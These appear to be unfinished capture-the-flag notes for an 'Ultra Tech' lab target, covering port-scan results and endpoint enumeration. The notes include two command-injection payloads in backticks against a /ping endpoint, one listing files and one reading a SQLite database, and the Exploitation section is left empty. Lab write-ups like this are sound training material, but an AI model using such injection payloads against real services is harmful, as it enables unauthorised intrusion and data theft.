# Ultra Tech

## Reconnaissance

IP addr : 10.10.207.242

## Scanning & Enumeration

### nmap Scan

open port are 21, 22, 8081(http nodejs), 31331(http apache

### htttp(8081) Enumeration

    - /auth
    - /ping
  
```php
/ping?ip=`ls`
/ping?ip=`cat+utech.db.sqlite`
```

### http(31331) Enumeration

    - /robots.txt
    - 

## Exploitation
